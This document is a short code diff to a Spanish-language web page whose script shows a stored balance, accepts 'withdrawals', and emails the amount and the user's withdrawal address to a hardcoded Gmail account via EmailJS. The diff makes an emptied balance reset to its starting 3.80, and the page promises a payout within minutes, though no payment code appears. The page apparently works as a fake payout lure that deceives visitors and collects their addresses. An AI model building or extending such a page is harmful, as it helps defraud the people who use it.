@@ -121,14 +121,7 @@
 
     <script>
         const initialBalance = 3.80;
-        let balance = localStorage.getItem('balance');
-
-        if (balance === null) {
-            balance = initialBalance;
-            localStorage.setItem('balance', balance.toFixed(2));
-        } else {
-            balance = parseFloat(balance);
-        }
+        let balance = parseFloat(localStorage.getItem('balance') || initialBalance);
 
         const balanceDisplay = document.getElementById('balance-display');
         const messageDiv = document.getElementById('message');
@@ -151,7 +144,7 @@
                 messageDiv.textContent = 'Su retiro está en proceso, dentro de 1 a 5 minutos se le enviará.';
 
                 // Enviar correo electrónico
-                emailjs.send('service_b244er4', 'service_b244er4', {
+                emailjs.send('service_b244er4', 'MagnegInvip', {
                     to_email: 'MagnegInvip@gmail.com',
                     amount: amount,
                     withdraw_address: withdrawAddress
@@ -164,7 +157,7 @@
                 setTimeout(function() {
                     messageDiv.textContent = '';
                     if (balance <= 0) {
-                        balance = 0;
+                        balance = initialBalance;
                         localStorage.setItem('balance', balance.toFixed(2));
                         updateBalanceDisplay();
                     }
